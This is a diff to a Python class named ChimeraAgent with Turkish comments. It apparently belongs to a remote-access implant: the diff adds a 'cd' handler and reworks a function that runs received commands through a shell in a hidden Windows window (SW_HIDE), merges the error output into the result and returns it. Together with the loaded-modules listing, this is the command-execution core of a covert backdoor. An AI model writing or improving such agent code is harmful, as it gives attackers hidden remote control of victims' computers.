@@ -290,6 +290,17 @@ class ChimeraAgent:
                 return "[-] Yüklü modül yok."
             return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])
 
+        # Özel komutlar - Dizin Değiştirme (cd)
+        if cmd.strip().lower().startswith("cd "):
+            try:
+                target_dir = cmd.strip()[3:].strip()
+                os.chdir(target_dir)
+                return f"[+] Dizin değiştirildi: {os.getcwd()}"
+            except FileNotFoundError:
+                return f"[!] Hata: Dizin bulunamadı: {target_dir}"
+            except Exception as e:
+                return f"[!] Hata: {str(e)}"
+
         try:
             # Komutu gizli pencerede çalıştır
             startupinfo = None
@@ -298,28 +309,35 @@ class ChimeraAgent:
                 startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                 startupinfo.wShowWindow = 0  # SW_HIDE
 
+            # stderr=subprocess.STDOUT ile hataları da çıktıya ekle
             proc = subprocess.Popen(
                 cmd,
                 shell=True,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
+                stderr=subprocess.STDOUT, 
                 stdin=subprocess.PIPE,
                 startupinfo=startupinfo
             )
-            stdout, stderr = proc.communicate(timeout=30)
+            stdout, _ = proc.communicate(timeout=30)
             
-            output = stdout + stderr
-            result = output.decode("utf-8", errors="ignore")
+            # Windows için decoding (cp1254, utf-8 vs.)
+            try:
+                result = stdout.decode("cp1254") if sys.platform == "win32" else stdout.decode("utf-8")
+            except:
+                result = stdout.decode("utf-8", errors="ignore")
             
             if not result.strip():
-                result = f"[Komut tamamlandı - çıkış kodu: {proc.returncode}]"
+                if proc.returncode == 0:
+                    result = "[+] Komut başarıyla çalıştırıldı (Çıktı yok)."
+                else:
+                    result = f"[!] Komut hatayla bitti - çıkış kodu: {proc.returncode}"
             
             return result
         except subprocess.TimeoutExpired:
             proc.kill()
             return "[!] Komut zaman aşımına uğradı (30s)"
         except Exception as e:
-            return f"[!] Hata: {str(e)}"
+            return f"[!] Komut Çalıştırma Hatası: {str(e)}"
 
     # --------------------------------------------------------
     # Ana Döngü
